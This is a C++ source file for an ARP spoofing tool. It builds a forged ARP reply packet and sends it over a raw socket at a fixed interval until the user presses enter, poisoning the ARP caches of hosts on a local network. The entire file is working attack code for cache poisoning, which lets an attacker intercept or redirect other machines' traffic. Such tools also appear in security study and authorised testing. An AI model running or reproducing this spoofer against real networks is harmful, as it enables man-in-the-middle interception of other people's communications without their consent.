#include "ARPSpoofer.h"

#include <iostream>
#include <cstring>
#include <poll.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <arpa/inet.h> 
#include <sys/ioctl.h> 

ARPSpoof::ARPSpoofer::ARPSpoofer() :
    timeElapsed(0.0f)
{

}

ARPSpoof::ARPSpoofer::~ARPSpoofer()
{

}

int ARPSpoof::ARPSpoofer::Spoof(const int socketFd, const char* interfaceName, const PacketCraft::ARPPacket& arpPacket)
{
    if(arpPacket.Send(socketFd, interfaceName) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Send() error!");
        return APPLICATION_ERROR;
    }

    return NO_ERROR;
}

int ARPSpoof::ARPSpoofer::SpoofLoop(const int socketFd, const char* interfaceName, const char* srcMAC, const char* dstMAC, const char* srcIP, 
    const char* dstIP)
{
    PacketCraft::ARPPacket arpPacket;
    if(arpPacket.Create(srcMAC, dstMAC, srcIP, dstIP, ARPType::ARP_REPLY) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Create() error!");
        return APPLICATION_ERROR;
    }

    pollfd pollFds[1]{};
    pollFds[0].fd = 0;      
    pollFds[0].events = POLLIN;

    std::cout << "\nSpoofing...press enter to stop\n\n";

    while(true)
    {
        int nEvents = poll(pollFds, sizeof(pollFds) / sizeof(pollFds[0]), ARP_SPOOF_FREQUENCY_MS);
        if(nEvents == 0)
        {
            if(Spoof(socketFd, interfaceName, arpPacket) == APPLICATION_ERROR)
            {
                LOG_ERROR(APPLICATION_ERROR, "Spoof() error!");
                return APPLICATION_ERROR;
            }
            else
            {
                std::cout << "Sending ARP packet: " << srcMAC << " is at " << srcIP << "\n";
            }
        }
        else
        {
            if(pollFds[0].revents & POLLIN)
            {
                std::cout << "stopping..." << std::endl;
                break;
            }
        }
    }

    return NO_ERROR;
}

